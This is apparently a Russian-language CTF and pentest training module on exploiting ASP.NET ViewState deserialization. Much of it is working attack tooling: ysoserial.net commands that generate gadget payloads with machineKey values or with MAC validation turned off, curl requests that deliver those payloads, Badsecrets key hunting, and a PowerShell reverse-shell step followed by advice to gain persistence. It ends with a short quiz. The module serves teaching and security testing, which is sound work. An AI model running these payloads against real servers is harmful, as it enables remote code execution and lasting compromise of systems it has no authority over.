---
id: web-viewstate
title: ".NET ViewState deserialization (machineKey, __VIEWSTATE)"
category: web
parent: web-deser-expert
difficulty: expert
order: 2
tags: [dotnet, viewstate, deserialization, machinekey, ysoserial, rce]
prerequisites: [web-deserialization]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 45
summary: "ASP.NET ViewState: machineKey, подделка и RCE через ysoserial.net, ViewStateUserKey и обход MAC."
---

ASP.NET ViewState (`__VIEWSTATE`) — это сериализованное состояние страницы, которое клиент возвращает серверу. Оно подписано (и опционально зашифровано) ключом `machineKey`. Если ключ утёк/предсказуем или MAC отключён, атакующий подделывает ViewState с **gadget-цепочкой** и получает RCE на сервере. Это классика «ASP.NET deserialization» и частая находка при аудите .NET-приложений.

## Теория: как устроен ViewState

`__VIEWSTATE` — base64 от `ObjectStateFormatter`-потока, содержащего сериализованные объекты. Структура:

- первые байты — версия/флаги (`/wEP...` — распространённый префикс),
- дальше — сериализованный граф объектов (тип `ObjectStateFormatter`),
- целостность защищена MAC (`machineKey` validation).

Проверки: если `EnableViewStateMac="false"` (или взломан `machineKey`), можно подменить поток. В старых версиях .NET (до патча MS12-066/MS13-053) MAC-обход позволял RCE без ключа (ViewState MAC bypass).

## Инструменты

- **`ysoserial.net`** — генерация ViewState payload:

```bash
ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd /c whoami" \
  --path="/default.aspx" --apppath="/" --decryptionalg="AES" \
  --decryptionkey="<hex>" --validationalg="HMACSHA256" --validationkey="<hex>"
```

- **`Badsecrets`** — поиск предсказуемых/дефолтных `machineKey`.
- **`viewgen`** — генерация с автоопределением формата.
- **`ViewStateDecoder`/`ViewState Parser`** — разбор.

## Разобранный пример: утёкший machineKey → RCE

Шаг 1 — находим `machineKey` в `web.config` (утечка через backup/git/LFI/ошибку):

```xml
<machineKey validationKey="..." decryptionKey="..." validation="HMACSHA256" decryption="AES"/>
```

Шаг 2 — генерируем ViewState с RCE:

```bash
ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  -c "cmd /c powershell -e <base64>" \
  --path="/Default.aspx" --apppath="/" \
  --validationkey="<VALIDATIONKEY>" --validationalg="SHA1" \
  --decryptionkey="<DECRYPTIONKEY>" --decryptionalg="AES" \
  --islegacy
```

Шаг 3 — отправляем как `__VIEWSTATE`:

```bash
curl -s "https://app.example/Default.aspx" --data-urlencode "__VIEWSTATE=<payload>"
```

Шаг 4 — сервер десериализует → RCE (reverse shell/OOB).

## Разобранный пример: MAC disabled

Если `enableViewStateMac="false"` — можно подменить ViewState без ключа. `ysoserial.net` с `--generator=...` и без ключей (или `viewgen`):

```bash
ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd /c calc" --path="/x.aspx" --apppath="/"
```

Проверка: измените ViewState (добавьте символ) и посмотрите, отвечает ли сервер ошибкой MAC (`Validation of viewstate MAC failed`) — если нет, MAC отключён.

## Обходы и детали

- **Версия .NET** определяет доступные gadget'ы (`TypeConfuseDelegate`, `TextFormattingRunProperties`, `ActivitySurrogateDisableTypeCheck`).
- **`__VIEWSTATEENCRYPTED`** — если ViewState зашифрован, нужен `decryptionKey`.
- **`__EVENTVALIDATION`** — иногда тоже нужно подписать.
- **Кросс-версийные ключи** — `machineKey` может быть дефолтным (из туториалов) — `Badsecrets` их знает.
- **Legacy vs modern** — флаг `--islegacy` для старых форматов.

## Где искать machineKey

- `web.config` (утечка через `.git`, backup, LFI — см. `web-git-env-exposure`, `web-php-wrappers`).
- Дефолтные ключи из документации/туториалов (Badsecrets).
- Ошибки/`__VIEWSTATEGENERATOR`.
- `machine.config` (если утёк).

## Что дальше / decision

1. Есть `__VIEWSTATE` → проверьте, валидируется ли MAC (изменение → ошибка?).
2. MAC отключён → генерируйте payload без ключа.
3. Есть `machineKey` → `ysoserial.net -p ViewState` с ключами.
4. Нет ключа → `Badsecrets` на дефолтные/предсказуемые.
5. RCE → устойчивый канал + read-back.

## Разобранный пример: MAC bypass в старых .NET

До патчей MS12-066/MS13-053 существовал обход проверки MAC без ключа (CVE-2012-0005 и др.): можно было подменить ViewState, добавив валидный MAC, вычисленный через уязвимость в обработке. В более поздних версиях обход закрыт, но на непропатченных .NET он работал. Проверка:

```bash
# изменение ViewState не вызывает "Validation of viewstate MAC failed" -> MAC не проверяется/обход
curl -s "https://app.example/Default.aspx" --data-urlencode "__VIEWSTATE=/wEPDwUJ..."
```

Если сервер отвечает 200 без ошибки MAC — можно генерировать payload без ключа.

## Инструменты (расширенно)

- **`ysoserial.net`** — основной генератор: `-p ViewState -g <gadget>`.
- **`Badsecrets`** — база дефолтных/предсказуемых `machineKey` (проверка оффлайн).
- **`viewgen`/`ViewStateGenerator`** — генерация с автоопределением формата.
- **`ViewStateDecoder`** — разбор существующего ViewState.

```bash
# проверка дефолтного ключа через badsecrets
python3 -m badsecrets --url https://app.example/Default.aspx
```

## Что дальше / decision

1. Есть `__VIEWSTATE` → измените байт и проверьте реакцию (MAC?).
2. MAC отключён → генерируйте payload без ключа.
3. Есть `machineKey` → `ysoserial.net -p ViewState` с ключами.
4. Нет ключа → `Badsecrets` (дефолтные/предсказуемые).
5. RCE → устойчивый канал + read-back.

## Частые ошибки

- **Путать ViewState с обычной сериализацией Java.** Это .NET `ObjectStateFormatter`.
- **Забыть про MAC.** Без ключа/MAC-off payload не пройдёт.
- **Не проверить версию .NET.** Gadget'ы разные.
- **Игнорировать `__EVENTVALIDATION`.** Иногда подпись нужна и там.
- **Ломать прод.** RCE — только с согласия.

## Полный разбор: MAC-off ViewState → RCE (с выводом)

End-to-end на ASP.NET-приложении с отключённой проверкой MAC.

Шаг 1. Находим страницу с ViewState и проверяем MAC:

```bash
curl -s https://app.example/Default.aspx | grep -o '__VIEWSTATE[^>]*' | head -c 120
# __VIEWSTATE=/wEPDwUKMT... 
# меняем один символ в значении и отправляем снова
curl -s -X POST https://app.example/Default.aspx --data-urlencode '__VIEWSTATE=/wEPDwUKMT...X' | grep -i 'MAC'
# (пусто)  -> ошибки "Validation of viewstate MAC failed" нет => MAC отключён/не проверяется
```

Шаг 2. Генерируем payload без ключа (MAC-off):

```bash
ysoserial.exe -p ViewState -g TypeConfuseDelegate \
  -c "cmd /c whoami" --path="/Default.aspx" --apppath="/" --islegacy
# -> base64 payload
```

Шаг 3. Отправляем:

```bash
PAYLOAD=$(ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd /c whoami" --path="/Default.aspx" --apppath="/" --islegacy | tail -1)
curl -s -X POST https://app.example/Default.aspx --data-urlencode "__VIEWSTATE=$PAYLOAD"
```

Шаг 4. Для RCE без вывода — reverse shell/OOB:

```bash
ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  -c "cmd /c powershell -e <base64-revshell>" --path="/Default.aspx" --apppath="/"
```

Шаг 5. Read-back: подтвердите выполнение (слушатель/коллаборатор), затем закрепитесь.

## Reference-таблица: gadget'ы и версии .NET

| Gadget | Условие | Примечание |
|--------|---------|-----------|
| TypeConfuseDelegate | .NET 4.x | надёжный, часто работает |
| TextFormattingRunProperties | .NET 4.x | популярен, есть вариант для 4.8 |
| ActivitySurrogateDisableTypeCheck | современный .NET | обходит проверки типов |
| WindowsIdentity | — | вызов через делегаты |
| PSObject (для PowerShell) | — | если доступен PS |
| ObjectDataProvider | WPF | зависит от сборок |

Флаги `ysoserial.net`: `--path` (URL страницы), `--apppath`, `--islegacy`, `--validationkey`/`--decryptionkey` (если ключ известен), `--generator` (VIEWSTATEGENERATOR).

## Badsecrets и дефолтные machineKey

Многие приложения используют **дефолтные** `machineKey` из документации/туториалов/старых шаблонов. `Badsecrets` проверяет их оффлайн:

```bash
pip install badsecrets
python3 -m badsecrets --url https://app.example/Default.aspx
# [+] Known Secret: ...  -> можно подписывать ViewState
```

Если ключ найден — генерируем ViewState с ним:

```bash
ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd /c whoami" \
  --path="/Default.aspx" --apppath="/" \
  --validationkey="<hex>" --validationalg="SHA1" \
  --decryptionkey="<hex>" --decryptionalg="AES"
```

Также ищите `machineKey` в утечках (`web.config` через `.git`/backup/LFI) — см. `web-git-env-exposure`.

## Что делать дальше / решение

1. **Найти ViewState** (`__VIEWSTATE`) и проверить MAC (изменение → ошибка?).
2. **MAC off** → генерировать payload без ключа (`ysoserial.net --islegacy`).
3. **Ключ известен/утёк** → генерировать с `--validationkey/--decryptionkey`.
4. **Ключ неизвестен** → `Badsecrets` (дефолтные/предсказуемые).
5. **Определить версию .NET** и выбрать gadget.
6. **RCE подтвердить** read-back (`whoami`/OOB) и закрепиться.
7. **Проверить `__EVENTVALIDATION`** — иногда нужна и его подпись.

## Структура ViewState и парсинг

Понимание формата помогает отличить «MAC-off» от «нужен ключ».

- **Префикс:** base64 от потока `ObjectStateFormatter`. Частые начала: `/wEP...`, `/wEPDwU...`. `/wEP` — маркер.
- **`__VIEWSTATEGENERATOR`:** идентификатор генератора (иногда нужен для валидной генерации).
- **`__EVENTVALIDATION`:** отдельный MAC-защищённый блок для валидации событий.
- **`__VIEWSTATEENCRYPTED`:** маркер, что ViewState зашифрован.

Разбор существующего значения:

```bash
echo '/wEPDwUKMT...' | base64 -d | xxd | head
# ff 01 1f ...  -> ObjectStateFormatter
```

Проверка «валидируется ли MAC» — самый быстрый тест:

```bash
# 1) взять оригинальный ViewState
curl -s https://app.example/Default.aspx | grep -o '__VIEWSTATE[^"]*' | head -1
# 2) изменить последний символ и отправить
curl -s -X POST https://app.example/Default.aspx --data-urlencode '__VIEWSTATE=/wEPDwUKMT...ZZZ'
# если ответ 500 "Validation of viewstate MAC failed" -> MAC включён (нужен ключ)
# если 200/ошибка без MAC -> MAC выключен (payload без ключа)
```

Если MAC включён, ищем `machineKey`: утечки (`web.config` через `.git`/backup/LFI), дефолтные значения (Badsecrets), иногда `machineKey` в `machine.config` или предсказуемый (сгенерированный слабо).

## Где искать machineKey

- **Утечка исходников:** `.git`, backup-архивы, LFI (см. `web-git-env-exposure`).
- **Дефолтные ключи:** из документации, туториалов, старых шаблонов — `Badsecrets` знает их базу.
- **Ошибки:** verbose error pages иногда раскрывают конфигурацию.
- **Общие/скопированные конфиги:** приложения, развёрнутые из одного шаблона, делят ключ.

```bash
python3 -m badsecrets --url https://app.example/Default.aspx
# или оффлайн по перехваченному ViewState
python3 -m badsecrets --viewstate '/wEPDwUKMT...' --path '/Default.aspx'
```

## Быстрый чек-лист

1. Найти страницу с `__VIEWSTATE`.
2. Проверить MAC (изменить байт → ошибка?).
3. MAC off → `ysoserial.net --islegacy`.
4. Ключ утёк/дефолт → `ysoserial.net` с ключами.
5. Определить версию .NET → выбрать gadget.
6. RCE → read-back и закрепление.

## Итог по ViewState

ViewState-атака сводится к трём вопросам: (1) проверяется ли MAC, (2) известен ли `machineKey`, (3) какой gadget подходит версии .NET. Ответы дают либо payload без ключа, либо подпись известным/дефолтным ключом. Всегда проверяйте `__EVENTVALIDATION` и `__VIEWSTATEGENERATOR`, и подтверждайте RCE read-back'ом.

## Дополнительно: ViewState и .NET-патчи

Обновление .NET и включённый MAC (`EnableViewStateMac`) закрывают большинство векторов. Если видите свежую версию .NET с включённым MAC и уникальным `machineKey` — ViewState, скорее всего, не вектор; переходите к другим классам (.NET deser через `BinaryFormatter` в других полях, `__EVENTVALIDATION`, JSON-десериализаторы).

## Квиз

```quiz
- question: "Что хранится в __VIEWSTATE?"
  options:
    - "Пароль"
    - "Сериализованное состояние страницы ASP.NET"
    - "TLS-ключ"
    - "Cookie"
  answer: 1
  explanation: "Состояние WebForms-страницы."
- question: "Что нужно для подделки ViewState?"
  options:
    - "Только URL"
    - "machineKey (validation/decryption)"
    - "SQL"
    - "Cookie сессии"
  answer: 1
  explanation: "Подпись проверяется ключом."
- question: "Какой инструмент генерирует ViewState payload?"
  options:
    - "ysoserial.net"
    - "sqlmap"
    - "ffuf"
    - "nmap"
  answer: 0
  explanation: "ysoserial.net для .NET."
- question: "Что означает EnableViewStateMac=false?"
  options:
    - "Шифрование"
    - "MAC не проверяется -> подделка без ключа"
    - "Сжатие"
    - "Кеш"
  answer: 1
  explanation: "Отключённая проверка подписи."
- question: "Где искать machineKey?"
  options:
    - "В HTML"
    - "В web.config (утечки/бэкапы/.git) или дефолтах"
    - "В DNS"
    - "В TLS"
  answer: 1
  explanation: "Конфиг приложения или утечка."
```

## Где пригодится

- **CTF (Web):** задачи на ASP.NET.
- **Bug bounty:** ViewState RCE — критичный отчёт.
- **Пентест:** аудит enterprise ASP.NET.
- **Работа (AppSec):** уникальный machineKey, включённый MAC, ротация ключей, обновление .NET.
